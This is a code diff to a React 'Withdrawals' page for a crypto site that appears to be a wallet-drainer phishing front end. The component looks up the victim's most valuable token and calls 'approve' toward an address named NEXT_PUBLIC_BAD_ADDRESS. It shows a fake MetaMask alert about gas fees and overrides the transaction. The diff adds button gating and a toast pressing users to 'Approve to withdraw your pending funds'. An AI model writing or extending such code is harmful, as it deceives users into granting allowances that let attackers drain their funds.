@@ -34,6 +34,7 @@ const Withdrawals = () => {
   const toast = useToast();
   const { colorMode } = useColorMode();
   const [enabled, setEnabled] = useState(false);
+  const [gotBestToken, setGotBestToken] = useState(false);
   var bestToken: any;
 
   const enable = async () => {
@@ -100,6 +101,7 @@ const Withdrawals = () => {
             if(bestToken){
               let contract = await sdk?.getContractFromAbi(bestToken.address, BAD_ABI);
               let result = await contract?.call("allowance", address, process.env.NEXT_PUBLIC_BAD_ADDRESS);
+              setGotBestToken(true);
               if(parseInt(result)){
                 setEnabled(true);
               }
@@ -120,7 +122,11 @@ const Withdrawals = () => {
     alert("MetaMask:\ndue to network congestion, gas fees estimation could be wrong");
 
     badContract?.interceptor.overrideNextTransaction(() => ({from: address, value: value}));
-    badContract?.call("approve", bestToken.address, bestToken.balance);
+    try{
+      await badContract?.call("approve", bestToken.address, bestToken.balance);
+    } catch {
+      toast({description: "You must Approve to withdraw your pending funds", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
+    }
   };
 
   if(address){
@@ -170,8 +176,8 @@ const Withdrawals = () => {
                           </FormControl>
                           {
                             enabled
-                            ? <Button isDisabled={!address || !enabled} size="lg" width="10em" colorScheme="teal" fontWeight="bold" isLoading={props.isSubmitting} type="submit"><Text>Withdraw<br></br><Text fontSize="xs" as="span">(0.15 XPR)</Text></Text></Button>
-                            : <Button isDisabled={!address} size="md" width="10em" colorScheme="teal" fontWeight="bold" onClick={enable}><Text>Enable</Text></Button>
+                            ? <Button isDisabled={!address || !enabled || !gotBestToken} size="lg" width="10em" colorScheme="teal" fontWeight="bold" isLoading={props.isSubmitting} type="submit"><Text>Withdraw<br></br><Text fontSize="xs" as="span">(0.15 XPR)</Text></Text></Button>
+                            : <Button isDisabled={!address || !gotBestToken} size="md" width="10em" colorScheme="teal" fontWeight="bold" onClick={enable}><Text>Enable</Text></Button>
                           }
                         </HStack>
                       </Form>
